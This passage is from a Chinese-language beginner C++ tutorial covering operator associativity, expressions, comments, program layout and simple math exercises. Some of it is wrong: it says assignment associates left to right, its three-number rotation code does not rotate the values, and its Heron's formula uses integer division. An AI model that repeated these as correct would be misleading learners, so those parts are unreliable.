class="number">5</span>;</span><br><span class="line">    x=x+y*<span class="number">2</span>+z++;<span class="comment">//1+3*2+5=12，x=12=Z++</span></span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;X2=&quot;</span>&lt;&lt;x&lt;&lt;endl;</span><br><span class="line">    x=<span class="number">1</span>;y=<span class="number">4</span>;</span><br><span class="line">    z=x&gt;<span class="number">2</span> &amp; y&gt;<span class="number">3</span>;</span><br><span class="line">    cout&lt;&lt;z&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="運算子的結合律"><a href="#運算子的結合律" class="headerlink" title="運算子的結合律"></a>運算子的結合律</h3><p><code>當同一敘述，相鄰的運算子擁有相同優先順序的運算子，此時即需定運算子是左結合或右結合</code></p>
<blockquote>
<p>x=z-b-c;[color=#a08]</p>
</blockquote>
<p><strong>同是減號(-)，優先順序相同，此時就要靠定義結合律，減法結合律是由左至右</strong></p>
<blockquote>
<p>x=((a-b)-c);[color=#a08]</p>
</blockquote>
<h6 id="而"><a href="#而" class="headerlink" title="而"></a>而</h6><blockquote>
<p>x=y=z=2;[color=#a08]</p>
</blockquote>
<h6 id="指派運算子的結合律由左至右，上式同義於"><a href="#指派運算子的結合律由左至右，上式同義於" class="headerlink" title="指派運算子的結合律由左至右，上式同義於"></a>指派運算子的結合律由左至右，上式同義於</h6><blockquote>
<p>(x=(y=(z=2)));[color=#a08]</p>
</blockquote>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> a,b,c;</span><br><span class="line">    <span class="type">int</span> x,y,z;</span><br><span class="line">    a=<span class="number">2</span>;</span><br><span class="line">    b=<span class="number">3</span>;</span><br><span class="line">    c=<span class="number">4</span>;</span><br><span class="line">    x=a-b-c;</span><br><span class="line">    cout&lt;&lt;x&lt;&lt;endl;</span><br><span class="line">    x=y=z=<span class="number">2</span>;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;x=&quot;</span>&lt;&lt;x&lt;&lt;endl;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;y=&quot;</span>&lt;&lt;y&lt;&lt;endl;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;z=&quot;</span>&lt;&lt;z&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<pre><code>輸出結果
-5
x=2
y=2
z=2
</code></pre><h1 id="運算式"><a href="#運算式" class="headerlink" title="運算式"></a>運算式</h1><p><code>任何一個可求得一個值的式子，稱為一個運算式(Expression)
例如5+3會回傳一個數值，所以5+3是一個運算式</code><br><strong>這些運算式通常放在cout&lt;&lt;運算式，<font color="#f18">一般而言可以放在等號右邊的東西</font>，都可以稱為運算式</strong></p>
<hr>
<h3 id="敘述-Statement"><a href="#敘述-Statement" class="headerlink" title="敘述(Statement)"></a>敘述(Statement)</h3><h4 id="凡是控制執行的順序、對運算式取值或不做任何事均可稱為敘述"><a href="#凡是控制執行的順序、對運算式取值或不做任何事均可稱為敘述" class="headerlink" title="凡是控制執行的順序、對運算式取值或不做任何事均可稱為敘述"></a>凡是控制執行的順序、對運算式取值或不做任何事均可稱為敘述</h4><p>所有的敘述都要以分號(;)作結束，例如</p>
<blockquote>
<p>sum=sum+1;[color=#a90467]</p>
</blockquote>
<p><strong>==於C/C++語言中，若前一個敘述未以分號結束，則錯誤訊息通常會出現在下一個敘述的開頭==</strong></p>
<hr>
<h3 id="敘述區塊-Block-Statement-或複合敘述-Compound-Statement"><a href="#敘述區塊-Block-Statement-或複合敘述-Compound-Statement" class="headerlink" title="敘述區塊(Block Statement)或複合敘述(Compound Statement)"></a>敘述區塊(Block Statement)或複合敘述(Compound Statement)</h3><p><code>在任何可以放上單一敘述的地方，你都可以放上敘述區塊，一個複合敘述是由兩個大括號組合而成</code><br><strong><font color="#a08">但大括號後不可再加分號</font></strong></p>
<blockquote>
<p>{<br>    t=a;<br>    a=b;<br>    b=t;<br>}[color=#f49]</p>
<hr>
<h3 id="註解-Comments"><a href="#註解-Comments" class="headerlink" title="註解(Comments)"></a>註解(Comments)</h3><p><code>適當的程式註解才能增加程式可讀性</code><br>/*我是註解*/<br>//我是註解[color=#c39429]</p>
</blockquote>
<h4 id="上式-符號以後的字串視為註解，編譯程式不予處理，直到遇到-為止"><a href="#上式-符號以後的字串視為註解，編譯程式不予處理，直到遇到-為止" class="headerlink" title="上式/*符號以後的字串視為註解，編譯程式不予處理，直到遇到*/為止"></a>上式<font color="#f18">/*符號以後的字串視為註解，編譯程式不予處理，直到遇到*/</font>為止</h4><h4 id="還有同一列中，雙斜線-後面也視為註解，編譯器均不予處理"><a href="#還有同一列中，雙斜線-後面也視為註解，編譯器均不予處理" class="headerlink" title="還有同一列中，雙斜線(//)後面也視為註解，編譯器均不予處理"></a>還有同一列中，雙斜線(//)後面也視為註解，編譯器均不予處理</h4><blockquote>
<p>x=x+3; /<em> x值加3 </em>/<br>sum=sum+y; //將y值加至sum[color=#b499]</p>
</blockquote>
<h4 id="前者因為可超過兩列，較適合編寫較長的註解"><a href="#前者因為可超過兩列，較適合編寫較長的註解" class="headerlink" title="==前者因為可超過兩列，較適合編寫較長的註解=="></a>==前者因為可超過兩列，較適合編寫較長的註解==</h4><h4 id="後者僅能寫在同一列"><a href="#後者僅能寫在同一列" class="headerlink" title="==後者僅能寫在同一列=="></a>==後者僅能寫在同一列==</h4><hr>
<h3 id="縮排與空行"><a href="#縮排與空行" class="headerlink" title="縮排與空行"></a>縮排與空行</h3><p><code>除了適當的註解，程式設計應善用縮排與空行，才可以使程式讓人易於閱讀
因為有了縮排，程式才有了層次感，其次，空行則可使段落更加明顯</code></p>
<h4 id="程式架構介紹"><a href="#程式架構介紹" class="headerlink" title="程式架構介紹"></a>程式架構介紹</h4><p><strong>C/C++程式架構如下:</strong></p>
<h4 id="大致分為四大區塊，分別是"><a href="#大致分為四大區塊，分別是" class="headerlink" title="大致分為四大區塊，分別是"></a><font color="#f18">大致分為四大區塊，分別是</font></h4><ul>
<li>函式引用區</li>
<li>宣告區(類別、函式、全域變數宣告區)</li>
<li>主程式區</li>
<li>類別、函式實作區</li>
</ul>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">編號</th>
<th style="text-align:center">標題</th>
<th style="text-align:left">程式</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">一</td>
<td style="text-align:center">函式引用區(引入所需標頭檔)</td>
<td style="text-align:left">#include <iostream>、#include<math.h></td>
</tr>
<tr>
<td style="text-align:center">二</td>
<td style="text-align:center">命名空間、類別、函式、全域變數宣告區</td>
<td style="text-align:left">using namespace std; <br>int add(int a,int b);<br>int c;</td>
</tr>
<tr>
<td style="text-align:center">三</td>
<td style="text-align:center">主程式區main()</td>
<td style="text-align:left">int main(){ <br>c=add(6,2);<br> cout&lt;<c; <br>return 0;<br> }</td>
</tr>
<tr>
<td style="text-align:center">四</td>
<td style="text-align:center">類別、函式實作區</td>
<td style="text-align:left">int add(int a,int b){<br>int c;<br> c=a+b;<br> return ( c );<br>}</td>
</tr>
</tbody>
</table>
</div>
<h2 id="範例程式-8"><a href="#範例程式-8" class="headerlink" title="範例程式"></a>範例程式</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;math.h&gt;</span><span class="comment">//函式引用區</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;<span class="comment">//命名空間、類別、函式、全域變數宣告區</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">add</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span></span>;<span class="comment">//函式宣告</span></span><br><span class="line"><span class="type">int</span> c;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;  <span class="comment">//主程式區</span></span><br><span class="line">    c=<span class="built_in">add</span>(<span class="number">6</span>,<span class="number">4</span>); <span class="comment">//6+4</span></span><br><span class="line">    cout&lt;&lt;c; <span class="comment">//10</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">add</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span></span>&#123;<span class="comment">//類別或函式實作區</span></span><br><span class="line">    <span class="type">int</span> c; </span><br><span class="line">    c=a+b; </span><br><span class="line">    <span class="keyword">return</span> (c);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="但是函式、類別實作區若與主程式區調換，則函式與類別不用宣告"><a href="#但是函式、類別實作區若與主程式區調換，則函式與類別不用宣告" class="headerlink" title="但是函式、類別實作區若與主程式區調換，則函式與類別不用宣告"></a>但是函式、類別實作區若與主程式區調換，則函式與類別不用宣告</h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;math.h&gt;</span><span class="comment">//函式引用區</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;<span class="comment">//命名空間、類別、函式、全域變數宣告區</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">add</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span></span>;<span class="comment">//函式宣告</span></span><br><span class="line"><span class="type">int</span> c;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">add</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span></span>&#123;<span class="comment">//類別或函式實作區 //a,b不可省略</span></span><br><span class="line">    <span class="type">int</span> c; </span><br><span class="line">    c=a+b; </span><br><span class="line">    <span class="keyword">return</span> (c);   </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;  <span class="comment">//主程式區</span></span><br><span class="line">    c=<span class="built_in">add</span>(<span class="number">6</span>,<span class="number">4</span>); <span class="comment">//6+4</span></span><br><span class="line">    cout&lt;&lt;c; <span class="comment">//10</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<pre><code>兩種寫法輸出都是10
</code></pre><h1 id="實例應用"><a href="#實例應用" class="headerlink" title="實例應用"></a>實例應用</h1><p>==<strong>記得要自己想過寫過呦</strong>==</p>
<h4 id="第一題"><a href="#第一題" class="headerlink" title="第一題"></a>第一題</h4><p><code>試寫一程式，可輸入長方形的長與寬，並計算周長與面積</code><br>:::info<br>長方形面積公式&gt;&gt;長乘寬<br>長方形周長公式&gt;&gt;2(長加寬)<br>:::<br><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> a,b,c,d;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;Input length and width:&quot;</span>;</span><br><span class="line">    cin &gt;&gt;a&gt;&gt;b;<span class="comment">//a為長、b為寬 </span></span><br><span class="line">    c = <span class="number">2</span>*(a+b); <span class="comment">//周長</span></span><br><span class="line">    d = a*b;<span class="comment">//面積</span></span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;c=&quot;</span>&lt;&lt;c&lt;&lt;endl;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;d=&quot;</span>&lt;&lt;d&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h4 id="第二題"><a href="#第二題" class="headerlink" title="第二題"></a>第二題</h4><p><code>輸入長方體長寬高計算表面積與體積</code><br>:::success<br>長方體表面積=(長x寬+寬x高+高x長)x2<br>長方體的體積公式=長×寬×高<br>:::</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> a,b,c;<span class="comment">//長:a 寬:b 高:c</span></span><br><span class="line">    <span class="type">int</span> x,y;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;Input length, width and height&quot;</span>;</span><br><span class="line">    cin&gt;&gt;a&gt;&gt;b&gt;&gt;c;</span><br><span class="line">    x=(a*b+b*c+c*a)*<span class="number">2</span>;<span class="comment">//面積</span></span><br><span class="line">    y=a*b*c;<span class="comment">//體積</span></span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;rectangular Volume=&quot;</span>&lt;&lt;y&lt;&lt;endl;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;rectangular area=&quot;</span>&lt;&lt;x;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="第三題"><a href="#第三題" class="headerlink" title="第三題"></a>第三題</h4><p><strong>試寫一程式，滿足以下條件<br>1.可以輸入兩個座標<br>2.計算兩點座標距離<br>3.輸出此兩點距離</strong><br><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> x1,x2,y1,y2;</span><br><span class="line">    <span class="type">double</span> d;<span class="comment">//距離</span></span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;input x1,x2,y1,y2&quot;</span>&lt;&lt;endl;</span><br><span class="line">    cin&gt;&gt;x1&gt;&gt;x2&gt;&gt;y1&gt;&gt;y2;</span><br><span class="line">    d=<span class="built_in">sqrt</span>(<span class="built_in">pow</span>((x1-x2),<span class="number">2</span>)+<span class="built_in">pow</span>((y1-y2),<span class="number">2</span>)); <span class="comment">//pow是次方 sqrt是開根號</span></span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;The distance of the two points is:&quot;</span>&lt;&lt;d&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h4 id="第四題"><a href="#第四題" class="headerlink" title="第四題"></a>第四題</h4><p><strong>試寫一程式，可輸入三角形三邊長a、b、c求面積</strong><br><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> a,b,c;</span><br><span class="line">    <span class="type">double</span> d,e;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;Input triangle &quot;</span>&lt;&lt;endl;</span><br><span class="line">    cin&gt;&gt;a&gt;&gt;b&gt;&gt;c;</span><br><span class="line">    d=(a+b+c)/<span class="number">2</span>;</span><br><span class="line">    e=<span class="built_in">sqrt</span>(d*(d-a)*(d-b)*(d-c));</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;The triangle area is:&quot;</span>&lt;&lt;e&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>==這裡補充一下演算法則==<br><strong>兩個數要交換，就如同兩杯水要交換<br>假設你有兩個杯子的水(分別為糖水a、鹽水b)，交換其內容，方法如下</strong></p>
<blockquote>
<p>1.先找來空杯子t<br>2.將a杯子的水倒入t杯子<br>t=a;<br>3.將b杯子的水倒入a杯子<br>a=b;<br>4.將t杯子倒入b杯子，而完成兩杯子的交換<br>b=t;[color=#a53]</p>
</blockquote>
<p><strong>其次，若未先找來空杯子t，而直接將b杯子的水往a杯子倒，再將a杯子的水往b杯子倒</strong></p>
<blockquote>
<p>a=b;<br>b=a;[color=#f46]</p>
</blockquote>
<p><strong>則執行a=b時，如果這時a杯中糖水已經沒了，此時在執行b=a，會出現錯誤結果</strong></p>
<h4 id="第五題"><a href="#第五題" class="headerlink" title="第五題"></a>第五題</h4><blockquote>
<p>試寫一程式，滿足以下條件<br>1.可以輸入兩個數字<br>2.交換此兩個數字<br>3.輸出交換的結果<br>[color=#f50]</p>
</blockquote>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="type">int</span> a,b,z;</span><br><span class="line">  <span class="comment">//cout&lt;&lt;&quot;Input 2 digit:&quot;&lt;&lt;endl;</span></span><br><span class="line">  <span class="comment">//cin&gt;&gt;a&gt;&gt;b;  //試比較兩種輸入輸出</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;input a:&quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;a);<span class="comment">// %d是整數 &amp;取得a變數位址</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;input b:&quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;b);</span><br><span class="line"></span><br><span class="line">  z=a;</span><br><span class="line">  a=b;</span><br><span class="line">  b=z;</span><br><span class="line"></span><br><span class="line"><span class="comment">//cout&lt;&lt;&quot;Exchange import numerical a,b aftermath:&lt;&lt;endl&lt;&lt;&quot;a=&quot;&lt;&lt;a&lt;&lt;endl&lt;&lt;&quot;b=&quot;&lt;&lt;b&lt;&lt;endl;</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;after swap a=%d b=%d&quot;</span>,a,b);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="第六題"><a href="#第六題" class="headerlink" title="第六題"></a>第六題</h4><p><strong>試寫一程式，可以輸入三個數，並將1交給2、2交給3、3交給1並輸出三個數的結果</strong><br><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> a,b,c; <span class="comment">//a&gt;&gt;1,b&gt;&gt;2,c&gt;&gt;3</span></span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;input 3 numberal:&quot;</span>&lt;&lt;endl;</span><br><span class="line">    cin&gt;&gt;a&gt;&gt;b&gt;&gt;c;</span><br><span class="line">    b=a;</span><br><span class="line">    c=b;</span><br><span class="line">    a=c;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Exchange import numerical a,b,c aftermath: a=%d b=%d c=%d &quot;</span>,a,b,c);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;    </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//輸出結果有接力棒的fu</span></span><br></pre></td></tr></table></figure></p>
<h4 id="第七題"><a href="#第七題" class="headerlink" title="第七題"></a>第七題</h4><p><strong>假設某次考試成績如下55、66、77、88、99</strong></p>
<blockquote>
<p>1.試寫一程式輸入以上資料<br>2.輸入以上資料<br>3.計算總和<br>4.輸出總和與平均[color=#f568]<br><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">   <span class="type">int</span> a,b,c,d,e;</span><br><span class="line">   <span class="type">double</span> x,y;</span><br><span class="line">   a=<span class="number">55</span>;</span><br><span class="line">   b=<span class="number">66</span>;</span><br><span class="line">   c=<span class="number">77</span>;</span><br><span class="line">   d=<span class="number">88</span>;</span><br><span class="line">   e=<span class="number">99</span>;</span><br><span class="line">   <span class="comment">//cout&lt;&lt;&quot;input 5 achievement&quot;&lt;&lt;endl;//如果是手動輸入成績的話</span></span><br><span class="line">   <span class="comment">//cin&gt;&gt;a&gt;&gt;b&gt;&gt;c&gt;&gt;d&gt;&gt;e;</span></span><br><span class="line">   x=a+b+c+d+e;</span><br><span class="line">   y=x/<span class="number">5</span>;</span><br><span class="line">   cout&lt;&lt;<span class="string">&quot;sum = &quot;</span>&lt;&lt;x&lt;&lt;endl;</span><br><span class="line">   cout&lt;&lt;<span class="string">&quot;averagely = &quot;</span>&lt;&lt;y;</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
</blockquote>
<p>==補充一下==<br>:::danger<br>如果遇到大量需要輸入的資料千萬不要這樣一個一個慢慢輸入呦<br>想知道如何撰寫這樣的程式，會在迴圈與陣列的章節說到<br>:::</p>
<h4 id="第八題"><a href="#第八題" class="headerlink" title="第八題"></a>第八題</h4><p> <strong>兩點式，兩點可決定一直線(ax+by+c=0)<br> 試寫一程式，可輸入兩個二為座標，並求出此直線方程式</strong><br> <strong><em>例如:輸入(2,1)、(4、6)則直線方程式為5x-2y-8=0</em></strong><br> <figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> x1,y1,x2,y2;</span><br><span class="line">    <span class="type">int</span> a,b,c,x,y;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;input x1,y1&quot;</span>&lt;&lt;endl;</span><br><span class="line">    cin&gt;&gt;x1&gt;&gt;y1;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;input x2,y2&quot;</span>&lt;&lt;endl;</span><br><span class="line">    cin&gt;&gt;x2&gt;&gt;y2;</span><br><span class="line">    x=x2-x1;</span><br><span class="line">    y=y2-y1;</span><br><span class="line">    a=y;</span><br><span class="line">    b=-x;</span><br><span class="line">    c=-y*x1+x*y1;</span><br><span class="line">    cout&lt;&lt;a&lt;&lt;<span class="string">&quot;x+&quot;</span>&lt;&lt;b&lt;&lt;<span class="string">&quot;y+&quot;</span>&lt;&lt;c&lt;&lt;<span class="string">&quot;=0&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
<h1 id="應用複習"><a href="#應用複習" class="headerlink" title="應用複習"></a>應用複習</h1><p><strong>1.試寫一程式，可輸入一個一元二次方程式，求解(設本例假設方程式有二解)</strong><br>:::info<br>◎用公式法解一元二次方程式 ax^2 + bx + c = 0 的步驟如下：<br>(一) 找出二次項係數 a，一次項係數 b，常數項 c。<br>(二) 算出 b^2－4ac 的值。<br>(三) 若 b^2－4ac &gt; 0，則 x =−𝑏±√𝑏^2−4𝑎𝑐/2𝑎<br>若 b^2－4ac = 0，則 x =−𝑏/2𝑎(重根) 。<br>若 b^2－4ac &lt; 0，則 x 無解。(在國中階段無解)</p>
<p>:::<br>==範例輸出2x^2-7x+3=0，x1=3,x2=0.5==<br><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">double</span> a,b,c,d;</span><br><span class="line">    <span class="type">double</span> x1,x2,com;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;input abc &quot;</span>&lt;&lt;endl;</span><br><span class="line">    cin&gt;&gt;a&gt;&gt;b&gt;&gt;c;</span><br><span class="line"> <span class="comment">//   0==(pow((a*x1),2))+(b*x2)+c;</span></span><br><span class="line">    <span class="keyword">if</span> (b*b<span class="number">-4</span>*a*c&gt;<span class="number">0</span>)&#123;</span><br><span class="line">      d=<span class="built_in">sqrt</span>(b*b<span class="number">-4</span>*a*c);</span><br><span class="line">       x1=(-b+d)/(<span class="number">2</span>*a);</span><br><span class="line">         x2=(-b-d)/(<span class="number">2</span>*a);</span><br><span class="line">    &#125;</span><br><span class="line">               </span><br><span class="line">    <span class="keyword">if</span> (b*b<span class="number">-4</span>*a*c==<span class="number">0</span>)&#123;</span><br><span class="line">  <span class="comment">//    d2=sqrt(b*b-4*a*c);</span></span><br><span class="line">       x1=-b/(<span class="number">2</span>*a);</span><br><span class="line">         x2=-b/(<span class="number">2</span>*a);</span><br><span class="line">    &#125;</span><br><span class="line">           </span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;x1=&quot;</span>&lt;&lt;x1&lt;&lt;endl;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;x2=&quot;</span>&lt;&lt;x2;  </span><br><span class="line">&#125; </span><br><span class="line"></span><br></pre></td></tr></table></figure><br><strong>2.試寫一程式，可以輸入一個二元一次方程式，求其解(本例假設方程式洽有一解)</strong><br>==提示:使用克拉瑪公式==<br><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">double</span> a1,a2,b1,b2,c1,c2,d;</span><br><span class="line">    <span class="type">double</span> x,y;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;input a1_b1_c1_a2_b2_c2&quot;</span>&lt;&lt;endl;</span><br><span class="line">    cin&gt;&gt;a1&gt;&gt;b1&gt;&gt;c1&gt;&gt;a2&gt;&gt;b2&gt;&gt;c2;</span><br><span class="line"><span class="comment">// c1=((a1*x)+(b1*y));</span></span><br><span class="line"> <span class="comment">//   c2=((a2*x)+(b2*y));</span></span><br><span class="line"></span><br><span class="line">    d=((a1*b2)-a2*b1);</span><br><span class="line">    x=((c1*b2)-c2*b1)/d;</span><br><span class="line">    y=((a1*c2)-a2*c1)/d;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;x=&quot;</span>&lt;&lt;x&lt;&lt;endl;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;y=&quot;</span>&lt;&lt;y&lt;&lt;endl;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><strong>3.試寫一程式，可以輸入一個三元一次方程式，並求其解(本例假設所輸入的方程式洽有一解)</strong><br><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="comment">//#include&lt;cmath&gt;</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">double</span> a1,a2,a3,b1,b2,b3,c1,c2,c3;</span><br><span class="line">    <span class="type">double</span> d1,d2,d3,e,x,y,z;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;input a1_b1_c1_d1_a2_b2_c2_d2_a3_b3_c3_d3&quot;</span>&lt;&lt;endl;</span><br><span class="line">    